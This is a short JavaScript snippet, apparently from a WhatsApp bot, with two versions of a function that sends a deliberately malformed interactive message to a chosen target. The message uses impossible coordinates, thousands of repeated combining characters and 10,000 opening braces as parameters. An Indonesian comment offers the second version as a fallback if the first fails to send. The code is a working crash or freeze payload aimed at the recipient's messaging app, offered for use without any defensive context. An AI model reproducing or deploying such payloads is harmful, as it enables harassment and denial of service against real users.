async function VxzBetaXx(target) {
  try {
    const message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "© VaxzyBetaXx",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
              },
            },
            body: { 
              text: `© VaxzyBetaXx${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await Vxz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (error) {
    console.error("Message relay failed:", error);
  }
}

//KALAU PESAN GA KE KIRIM COBA PAKE YANG DI BAWAH INI
async function VxzBetaXx(target) {
  try {
    const message = {
      viewOneMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "© VaxzyBetaXx",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.999999999999,
              },
            },
            body: { 
              text: `© VaxzyBetaXx${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: Array(6).fill().map(() => ({
                name: Math.random() > 0.5 ? "mpm" : "single_select",
                buttonParamsJson: ""
              }))
            },
          },
        },
      },
    };

    await Vxz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (error) {
    console.error("Message relay failed:", error);
  }
}